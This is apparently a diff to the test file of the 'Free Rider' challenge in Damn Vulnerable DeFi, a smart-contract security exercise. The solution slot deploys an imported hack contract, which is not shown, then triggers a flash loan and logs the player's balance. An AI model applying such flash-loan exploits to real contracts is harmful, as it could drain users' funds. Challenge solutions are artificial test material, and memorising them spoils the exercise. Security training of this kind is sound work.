@@ -9,6 +9,7 @@ import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV
 import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
+import {HackFreeRiderNFTMarketplace} from "../../src/free-rider/HackFreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
@@ -123,7 +124,14 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+
+        console.log("player balance before", address(player).balance);
+
+        HackFreeRiderNFTMarketplace hackContract = new HackFreeRiderNFTMarketplace(uniswapPair, marketplace, weth, nft, address(recoveryManager));
+        hackContract.flashLoan();
+
+        console.log("player balance after", address(player).balance);
+
     }
 
     /**
